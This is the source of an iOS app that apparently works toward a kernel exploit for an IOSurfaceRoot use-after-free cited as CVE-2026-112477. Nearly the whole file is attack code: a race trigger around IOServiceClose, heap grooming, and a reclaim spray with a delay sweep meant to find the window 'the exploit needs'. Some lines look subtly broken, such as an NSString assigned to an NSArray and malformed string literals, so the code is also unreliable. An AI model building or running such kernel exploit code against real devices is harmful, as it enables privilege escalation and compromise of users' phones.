// israce v3.8: reclaim delay sweep + nospray control + crash self-report.
// v3.8 change from the v3.7 panic evidence: the kernel log shows the SAME fault site
// (IOSurface ldr x0,[x0,#0xd8], stale pointer tag 0xf6) but the slot's new tag moved
// 0xfd -> 0xfe between runs: the reclaim reallocation differs per boot. The dying case's
// delay lives only in the app's on-device ndjson, so v3.8 parses that file on launch and
// puts the last unfinished case + its delay on screen for 8 s before resuming, so every
// crash names its own delay. Baseline trigger replication of the published iOS 27.0.1
// IOSurfaceRoot registry-node UAF (CVE-2026-112477) on iPhone18,5 / 24A446.
// v3.8 change from the v3.6 panic evidence: the crash pc was IOSurface's own list-walk deref
// (ldr x0,[x0,#0xd8]) on a node whose member pointer was stale (tag 0xf6 vs expected 0xfd),
// i.e. the slot was already reallocated when the walk ran. v3.8 delays the reclaim spray
// 0..300 ms after the free (per-iteration sweep, logged as a dly note) to map the window in
// which the walk still reads the freed-but-not-yet-reused node, and adds a nospray control
// that never reallocates at all.
// Method follows Kimi-2011's public research notes (github.com/Kimi-2011/ios27-iosurface-uaf,
// out/RESEARCH-IOSURFACE-UAF.md): async sel17 register with wake port + ref, surface under
// concurrent lock/unlock pressure, jittered sleep, IOServiceClose before CFRelease.
// Implementation written fresh from the published recipe; credit to the original research.
// Evidence design: ndjson begin/end per case, fflush each line; a panic leaves "begin without end".
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <pthread.h>
#import <sys/time.h>
#import <unistd.h>
#import <fcntl.h>
#import <IOKit/IOReturn.h>
#import <IOKit/IOKitLib.h>

#define SEL_REG 17
#define SEL_DEREG 18

static NSString *gDoc = nil;
static FILE *gLog = NULL, *gNd = NULL;
static pthread_mutex_t gMx = PTHREAD_MUTEX_INITIALIZER;
static double gT0 = 0;
static volatile int gStop = 0, gPhase = 0;
static int gCaseRan = 0, gEnds = 0, gOK = 0;
static NSMutableSet *gDone = nil;

static double nowSec(void) { struct timeval tv; gettimeofday(&tv, NULL);
  return (double)tv.tv_sec + tv.tv_usec / 1e6 - gT0; }
static uint64_t nowNs(void) { struct timeval tv; gettimeofday(&tv, NULL);
  return (uint64_t)tv.tv_sec * 1000000000ull + (uint64_t)tv.tv_usec * 1000ull; }

static void L(NSString *fmt, ...) {
  if (!gLog) return; va_list a; va_start(a, fmt);
  NSString *s = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a);
  pthread_mutex_lock(&gMx); fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); pthread_mutex_unlock(&gMx);
}
static void ND(NSString *line) {
  if (!gNd) return;
  pthread_mutex_lock(&gMx); fprintf(gNd, "%s\n", line.UTF8String); fflush(gNd);
  int nfd = fileno(gNd); if (nfd >= 0) fsync(nfd); pthread_mutex_unlock(&gMx);
}
static void beginCase(NSString *k) { ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"begin\",\"t\":%.3f}", k, nowSec()]); }
static void endCase(NSString *k, NSString *f) { ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"end\",\"t\":%.3f%@}", k, nowSec(), f ? f : @""]); gEnds++; }
static void noteEvent(NSString *ev, NSString *f) { ND([NSString stringWithFormat:@"{\"k\":\"@%@\",\"ph\":\"note\",\"t\":%.3f%@}", ev, nowSec(), f ? f : @""]); }

// stage checkpoint: fsynced so a kernel wedge cannot eat it
static void CKPT(NSString *stage) {
  noteEvent(@"ckpt", [NSString stringWithFormat:@",\"stage\":\"%@\"", stage]);
  if (gNd) { int fd = fileno(gNd); if (fd >= 0) fsync(fd); }
}

// ---- IOSurface private API ----
typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pCreate)(CFDictionaryRef);
static uint32_t (*pGetID)(IOSurfaceRef_);
static kern_return_t (*pLock)(IOSurfaceRef_, uint32_t, uint32_t *);
static kern_return_t (*pUnlock)(IOSurfaceRef_, uint32_t, uint32_t *);
static void loadIOSurface(void) {
  void *h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
  if (!h) h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
  pCreate = dlsym(h, "IOSurfaceCreate");
  pGetID = dlsym(h, "IOSurfaceGetID");
  pLock = dlsym(h, "IOSurfaceLock");
  pUnlock = dlsym(h, "IOSurfaceUnlock");
  L(@"iosurface syms create=%d getid=%d lock=%d unlock=%d", !!pCreate, !!pGetID, !!pLock, !!pUnlock);
}
static IOSurfaceRef_ mkSurface(void) {
  if (!pCreate) return NULL;
  int w = 64, h = 4, bpe = 4, pf = 0x42475241;
  CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
  CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
  CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
  CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
  const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
  const void *vv[4] = { W, H, B, P };
  CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
  IOSurfaceRef_ s = pCreate(d);
  CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
  return s;
}

// ---- IOKit ----
static io_service_t gSvc = 0;
static int openConn(io_connect_t *out) { return IOServiceOpen(gSvc, mach_task_self(), 0, out); }
static mach_port_t newWakePort(void) {
  mach_port_t p = MACH_PORT_NULL;
  if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) return MACH_PORT_NULL;
  return p;
}
static void dropPort(mach_port_t p) {
  if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}
// async sel17: wake port + 1 reference, 24-byte struct input {1,2,3}
static kern_return_t regAsync(io_connect_t c, mach_port_t wp) {
  uint64_t in[3] = { 1, 2, 3 };
  uint64_t ref = 0x1122334455667788ull;
  uint32_t soc = 0;
  return IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL);
}
static kern_return_t regSync(io_connect_t c) {
  uint64_t in[3] = { 1, 2, 3 };
  return IOConnectCallMethod(c, SEL_REG, NULL, 0, in, 24, NULL, NULL, NULL, NULL);
}
static kern_return_t deregSync(io_connect_t c, mach_port_t wp) {
  uint64_t in[3] = { 1, 2, 3 };
  uint32_t soc = 0;
  return IOConnectCallAsyncMethod(c, SEL_DEREG, wp, NULL, 0, NULL, 0, in, 24, NULL, &soc, NULL, NULL);
}

// ---- pressure threads ----
static volatile int gRun = 0;
static io_connect_t gConn = 0;
static mach_port_t gConnWp = MACH_PORT_NULL;
static IOSurfaceRef_ gSurf = NULL;
static volatile uint64_t gOps = 0;
static void *spamLock(void *arg) {
  IOSurfaceRef_ s = (IOSurfaceRef_)arg; uint32_t seed = 0;
  while (gRun) { if (pLock) pLock(s, 0, &seed); if (pUnlock) pUnlock(s, 0, &seed); __sync_fetch_and_add(&gOps, 1); }
  return NULL;
}
static void *spamReg(void *arg) {
  (void)arg;
  while (gRun) { regAsync(gConn, gConnWp); __sync_fetch_and_add(&gOps, 1); }
  return NULL;
}

// ---- variants ----
// V_LOCKDEG: register, surface + 4 lock/unlock threads, jittered sleep, close, brief settle, stop, release.
// The published hit case: hit at iteration 100 of 200.
static int runLockdeg(int iter, int nth) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"lockdeg i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
  IOSurfaceRef_ s = mkSurface();
  if (!s) { IOServiceClose(c); dropPort(wp); return -102; }
  gRun = 1;
  if (nth < 2) nth = 2; if (nth > 8) nth = 8;
  pthread_t th[8];
  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamLock, s);
  usleep(100 + (iter % 60) * 30);
  IOServiceClose(c);            // crash point per research
  gOps++;
  usleep(300);
  gRun = 0;
  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
  CFRelease(s);                 // release only after close
  dropPort(wp);
  return 0;
}
// V_RACE1: register + 6 re-register spam threads, jittered sleep, close.
static int runRace1(int iter, int nth) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"race1 i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
  gConn = c; gConnWp = wp; gRun = 1;
  if (nth < 4) nth = 4; if (nth > 8) nth = 8;
  pthread_t th[8];
  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamReg, NULL);
  usleep(80 + (iter % 80) * 25);
  IOServiceClose(c);
  gOps++;
  usleep(700);
  gRun = 0;
  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
  dropPort(wp);
  return 0;
}
// V_POSTCLOSE: hold an extra send right so the connection survives IOServiceClose;
// then re-register after teardown -> the "deregistered then re-registered" path.
static int runPostclose(int iter) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
  uint32_t rcs[5] = {0};
  rcs[0] = (uint32_t)regAsync(c, wp);
  rcs[1] = (uint32_t)regAsync(c, wp);
  IOServiceClose(c);
  rcs[2] = (uint32_t)regAsync(c, wp);
  rcs[3] = (uint32_t)regAsync(c, wp);
  rcs[4] = (uint32_t)deregSync(c, wp);
  gOps += 5;  // postclose makes five IOKit calls per case
  mach_port_deallocate(mach_task_self(), c);
  dropPort(wp);
  L(@"postclose i%d rc=0x%x/0x%x/0x%x/0x%x/0x%x", iter, rcs[0], rcs[1], rcs[2], rcs[3], rcs[4]);
  return (rcs[2] == 0) ? 1 : 0;
}


// ---- v3.6 reclaim spray helpers ----
static void freeSpray(void);
// Small surfaces allocate several small kernel objects; create/destroy churn
// shapes the allocator freelist so the race-freed node's slot gets refilled by
// our own allocations before the registry walk dereferences it.
static IOSurfaceRef_ *gSpray = NULL;
static int gSprayN = 0;
static int spraySurfaces(int n, int vary) {
  freeSpray();
  if (!pCreate) return -1;
  gSpray = (IOSurfaceRef_ *)malloc(sizeof(IOSurfaceRef_) * n);
  if (!gSpray) return -2;
  int made = 0;
  for (int i = 0; i < n; i++) {
    int w = vary ? (1 + (i % 4)) : 1, h = 1, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vv[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    gSpray[i] = pCreate(d); if (gSpray[i]) made++;
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
  }
  gSprayN = n;
  return made;
}
static void drainSpray(int keepStride) {
  if (!gSpray) return;
  for (int i = 0; i < gSprayN; i++)
    if (gSpray[i] && (keepStride <= 1 || (i % keepStride) != 0)) { CFRelease(gSpray[i]); gSpray[i] = NULL; }
}
static void freeSpray(void) {
  if (!gSpray) return;
  for (int i = 0; i < gSprayN; i++) if (gSpray[i]) CFRelease(gSpray[i]);
  free(gSpray); gSpray = NULL; gSprayN = 0;
}

// V_RECLAIM v3.8: groom (create 256, hole every other) -> race window identical to
// lockdeg -> IOServiceClose (free point) -> delay sweep (0,1,3,8,20,50,120,300 ms
// per iteration; the dly note records it) -> 256-surface reclaim spray with varied
// sizes -> join -> CFRelease(victim). Panic vs survive at a known delay maps when
// the stale deref runs relative to slot reuse; the pre-reuse window is the MTE-safe
// window the exploit needs.
static int runReclaim(int iter, int nth) {
  int groom = spraySurfaces(256, 0);
  if (groom < 0) return groom;
  drainSpray(2);                 // keep every 2nd -> ~128 holes
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); freeSpray(); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"reclaim i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); freeSpray(); return (int)r; }
  IOSurfaceRef_ s = mkSurface();
  if (!s) { IOServiceClose(c); dropPort(wp); freeSpray(); return -102; }
  gRun = 1;
  if (nth < 2) nth = 2; if (nth > 8) nth = 8;
  pthread_t th[8];
  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamLock, s);
  usleep(100 + (iter % 60) * 30);
  IOServiceClose(c);             // free point
  gOps++;
  static const int kDelaysUs[8] = { 0, 1000, 3000, 8000, 20000, 50000, 120000, 300000 };
  int dly = kDelaysUs[iter % 8];
  CKPT(@"freed");
  noteEvent(@"dly", [NSString stringWithFormat:@",\"us\":%d", dly]);
  if (dly) usleep(dly);
  CKPT(@"pre-spray");
  int spray = spraySurfaces(256, iter % 2); // reclaim: frees the 128 groom survivors first, then refills; vary=1 mixes sizes
  CKPT(@"reclaim-sprayed");
  gRun = 0;
  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
  CFRelease(s);                   // walk point
  gOps++;
  L(@"reclaim i%d groom=%d spray=%d nth=%d survived", iter, groom, spray, nth);
  dropPort(wp);
  freeSpray();
  return (spray > 0) ? 1 : 0;
}
// V_NOSPRAY: identical race to lockdeg, free point, then NOTHING is reallocated:
// 20 ms settle with no spray, join, release. If the stale deref runs before any
// reuse of the slot the MTE tag still matches and it must survive; a panic here
// means unrelated kernel traffic reused the slot first.
static int runNospray(int iter, int nth) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"nospray i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
  IOSurfaceRef_ s = mkSurface();
  if (!s) { IOServiceClose(c); dropPort(wp); return -102; }
  gRun = 1;
  if (nth < 2) nth = 2; if (nth > 8) nth = 8;
  pthread_t th[8];
  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamLock, s);
  usleep(100 + (iter % 60) * 30);
  IOServiceClose(c);             // free point, no reclaim
  gOps++;
  CKPT(@"freed-nospray");
  usleep(20000);
  gRun = 0;
  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
  CFRelease(s);
  L(@"nospray i%d survived", iter);
  dropPort(wp);
  return 1;
}

static void loadDone(void) {
  NSString *p = [gDoc stringByAppendingPathComponent:@"israce.ndjson"];
  NSString *s = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
  gDone = [NSMutableSet new];
  if (!s) return;
  for (NSString *line in [s componentsSeparatedByString:@"\n"]) {
    if (![line containsString:@"\"ph\":\"end\""]) continue;
    NSRange r1 = [line rangeOfString:@"\"k\":\""];
    if (r1.location == NSNotFound) continue;
    NSUInteger a = r1.location + r1.length;
    NSRange r2 = [line rangeOfString:@"\"" options:0 range:NSMakeRange(a, line.length - a)];
    if (r2.location == NSNotFound) continue;
    [gDone addObject:[line substringWithRange:NSMakeRange(a, r2.location - a)]];
  }
  L(@"resume: %lu ends already on file", (unsigned long)gDone.count);
}
static NSString *gResumeKey = nil;
static int gResumeDlyUs = -1;

// v3.8: parse the ndjson for the last case that has begin without end (the one the panic
// killed) and the last dly note inside it, so the crash self-reports which delay died.
static void loadResumeInfo(void) {
  NSString *p = [gDoc stringByAppendingPathComponent:@"israce.ndjson"];
  NSData *d = [NSData dataWithContentsOfFile:p];
  if (!d) return;
  NSArray *ls = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
  if (!ls) return;
  for (NSString *line in ls) {
    if (line.length == 0) continue;
    NSRange rb = [line rangeOfString:@","\"ph\":\"begin\""]];
    NSRange re = [line rangeOfString:@","\"ph\":\"end\""]];
    if (rb.location != NSNotFound) {
      NSRange rk = [line rangeOfString:@"\"k\":\""];
      if (rk.location != NSNotFound) {
        NSUInteger s2 = rk.location + 5, e2 = [line rangeOfString:@"\"" options:0 range:NSMakeRange(s2, line.length - s2)].location;
        if (e2 != NSNotFound && e2 > s2) { gResumeKey = [line substringWithRange:NSMakeRange(s2, e2 - s2)]; gResumeDlyUs = -1; }
      }
    } else if (re.location != NSNotFound && gResumeKey) {
      NSRange rk = [line rangeOfString:@"\"k\":\""];
      if (rk.location != NSNotFound) {
        NSUInteger s2 = rk.location + 5, e2 = [line rangeOfString:@"\"" options:0 range:NSMakeRange(s2, line.length - s2)].location;
        if (e2 != NSNotFound && e2 > s2) {
          NSString *k = [line substringWithRange:NSMakeRange(s2, e2 - s2)];
          if ([k isEqualToString:gResumeKey]) { gResumeKey = nil; gResumeDlyUs = -1; }
        }
      }
    } else if ([line containsString:@"\"k\":\"@dly\""] && gResumeKey) {
      NSRange ru = [line rangeOfString:@"\"us\":"];
      if (ru.location != NSNotFound) {
        NSUInteger s2 = ru.location + 5;
        NSString *sub = [line substringFromIndex:s2];
        NSMutableString *num = [NSMutableString string];
        for (NSUInteger q = 0; q < sub.length; q++) {
          unichar ch = [sub characterAtIndex:q];
          if (ch >= '0' && ch <= '9') [num appendFormat:@"%C", ch]; else break;
        }
        if (num.length) gResumeDlyUs = [num intValue];
      }
    }
  }
}


static const double kStartBudget = 300.0;   // seconds of sweep before wrapping up
static volatile int gPass = 0;
static const int kSweepPasses = 64;
static void runAll(void) {
  CKPT(@"calib-start");
  // calibrate: sync must fail (0xE00002C2), async must succeed
  {
    io_connect_t c = 0; mach_port_t wp = newWakePort();
    if (openConn(&c) == KERN_SUCCESS) {
      uint32_t rs = (uint32_t)regSync(c);
      uint32_t ra = (uint32_t)regAsync(c, wp);
      L(@"calib sync=0x%x async=0x%x svc=0x%x", rs, ra, (uint32_t)gSvc);
      noteEvent(@"calib", [NSString stringWithFormat:@",\"sync\":%u,\"async\":%u", rs, ra]);
      if (ra != KERN_SUCCESS) { noteEvent(@"abort", @",\"why\":\"async sel17 did not register\""); IOServiceClose(c); dropPort(wp); return; }
      IOServiceClose(c); dropPort(wp);
    } else { noteEvent(@"abort", @",\"why\":\"open failed\""); return; }
  }
  CKPT(@"calib-done");
  struct { int v, it; const char *tag; } plan[] = {
    { 3, 16,  "reclaim" },
    { 4, 24,  "nospray" },
    { 2, 40,  "postclose" },
    { 0, 200, "lockdeg" },
    { 1, 100, "race1" },
  };
  int nplan = (int)(sizeof(plan) / sizeof(plan[0]));
  for (gPass = 0; gPass < kSweepPasses; gPass++) {
    noteEvent(@"pass", [NSString stringWithFormat:@",\"pass\":%d,\"lt\":%d,\"rt\":%d", gPass, 2 + (gPass % 5), 4 + (gPass % 5)]);
    for (int p = 0; p < nplan; p++) {
      int iterBase = gPass * 37;
      int nth = (plan[p].v == 0 || plan[p].v == 3 || plan[p].v == 4) ? (2 + (gPass % 5)) : (plan[p].v == 1) ? (4 + (gPass % 5)) : 4;
      for (int i = 0; i < plan[p].it; i++) {
        if (gStop || nowSec() > kStartBudget) {
          noteEvent(@"budget", [NSString stringWithFormat:@",\"pass\":%d,\"at\":\"%s-%d\",\"t\":%.2f", gPass, plan[p].tag, i, nowSec()]);
          return;
        }
        NSString *key = [NSString stringWithFormat:@"P%03d-%s-I%04d", gPass, plan[p].tag, i];
        if ([gDone containsObject:key]) continue;
        gPhase = plan[p].v;
        gOps = 0;  // v3.5: every case starts its own op count so ops:0 means the case truly did nothing
        beginCase(key);
        gCaseRan++;
        uint64_t t0 = nowNs();
        int rc = 0;
        int jit = i + iterBase;
        @autoreleasepool {
          if (plan[p].v == 0) rc = runLockdeg(jit, nth);
          else if (plan[p].v == 1) rc = runRace1(jit, nth);
          else if (plan[p].v == 3) rc = runReclaim(jit, nth);
          else if (plan[p].v == 4) rc = runNospray(jit, nth);
          else rc = runPostclose(i);
        }
      uint64_t ms = (nowNs() - t0) / 1000000ull;
      endCase(key, [NSString stringWithFormat:@",\"v\":%d,\"i\":%d,\"rc\":%d,\"ms\":%llu,\"ops\":%llu",
                    plan[p].v, i, rc, (unsigned long long)ms, (unsigned long long)gOps]);
      if (rc == 0 || rc == 1) gOK++;
    }
    noteEvent(@"phase.done", [NSString stringWithFormat:@",\"tag\":\"%s\",\"t\":%.2f", plan[p].tag, nowSec()]);
    L(@"phase %s done at %.2fs", plan[p].tag, nowSec());
    }
  }
  noteEvent(@"sweep.done", [NSString stringWithFormat:@",\"passes\":%d,\"ran\":%d", gPass, gCaseRan]);
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UILabel *label;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
  struct timeval tv; gettimeofday(&tv, NULL);
  gT0 = (double)tv.tv_sec + tv.tv_usec / 1e6;
  gDoc = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
  gLog = fopen([[gDoc stringByAppendingPathComponent:@"israce.log"] UTF8String], "w");
  gNd = fopen([[gDoc stringByAppendingPathComponent:@"israce.ndjson"] UTF8String], "a");
  // v3.3: fsync the Documents DIRECTORY once so the files' directory entries are durable across a kernel reset
  { int dfd = open([gDoc UTF8String], O_RDONLY); if (dfd >= 0) { fsync(dfd); close(dfd); } }
  CKPT(@"launch");
  L(@"probe v3.8 sweep start t=%.3f doc=%@", nowSec(), gDoc);
  self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
  UIViewController *root = [UIViewController new];
  root.view.backgroundColor = [UIColor blackColor];
  CGRect b = UIScreen.mainScreen.bounds;
  UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, b.size.width - 32, b.size.height - 160)];
  lab.text = @"israce v3.8 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
  lab.textColor = [UIColor greenColor];
  lab.numberOfLines = 0;
  lab.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
  lab.textAlignment = NSTextAlignmentCenter;
  [root.view addSubview:lab];
  self.label = lab;
  self.window.rootViewController = root;
  [self.window makeKeyAndVisible];
  loadDone();
  CKPT(@"resume-loaded");
  loadResumeInfo();
  if (gResumeKey) {
    NSString *dly = (gResumeDlyUs >= 0) ? [NSString stringWithFormat:@"%d us", gResumeDlyUs] : @"(not logged)";
    self.label.text = [NSString stringWithFormat:@"LAST CRASH: %@\ndelay before spray: %@\nresuming past done cases in 8s...", gResumeKey, dly];
    L(@"resume: last crash case %@ dly=%d", gResumeKey, gResumeDlyUs);
  } else {
    self.label.text = @"israce v3.8 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
  }
  double startDelay = gResumeKey ? 8.0 : 0.5;
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(startDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
  dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
    @autoreleasepool {
      loadIOSurface();
      CKPT(@"syms");
      const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
      for (int i = 0; cand[i] && !gSvc; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it) continue;
        io_object_t first = IOIteratorNext(it);
        while (true) { io_object_t o = IOIteratorNext(it); if (!o) break; IOObjectRelease(o); }
        IOObjectRelease(it);
        if (first) gSvc = first;
      }
      L(@"svc=0x%x", (uint32_t)gSvc);
      CKPT(@"svc");
      if (!gSvc) { noteEvent(@"abort", @",\"why\":\"no IOSurfaceRoot service\""); self.label.text = @"no IOSurfaceRoot service"; return; }
      runAll();
      if (!gStop) {
        L(@"probe v3.8 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
        noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"passes\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, gPass, nowSec()]);
        self.label.text = [NSString stringWithFormat:@"sweep done\n%d passes, ran %d ok %d\n%.1fs", gPass, gCaseRan, gOK, nowSec()];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ exit(0); });
      }
    }
  });
  });
  return YES;
}
@end
int main(int argc, char *argv[]) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
